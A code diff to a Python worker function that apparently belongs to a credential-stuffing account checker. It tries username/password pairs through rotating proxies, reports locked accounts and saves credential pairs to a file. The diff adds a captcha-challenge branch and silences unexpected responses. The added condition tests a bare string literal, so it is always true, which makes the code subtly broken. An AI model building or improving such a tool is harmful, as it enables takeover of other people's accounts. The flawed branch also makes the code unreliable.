@@ -199,8 +199,13 @@ def worker(username, password, proxies, unix):
                 print(f"{Fore.CYAN}Account locked: {username}")
                 return
 
+            elif "Challenge is required":
+                save_to_file(locked_file, f"{username}:{password}")
+                print(f"{Fore.YELLOW}Account captcha: {username}")
+                return
             else:
-                print(f"{Fore.MAGENTA}Unexpected response for {username}")
+                pass
+
         except requests.RequestError as e:
             print(f"{Fore.RED}Proxy error: {proxy}, Attempt: {attempt+1}/{retry_attempts}. Retrying...")
             time.sleep(1)
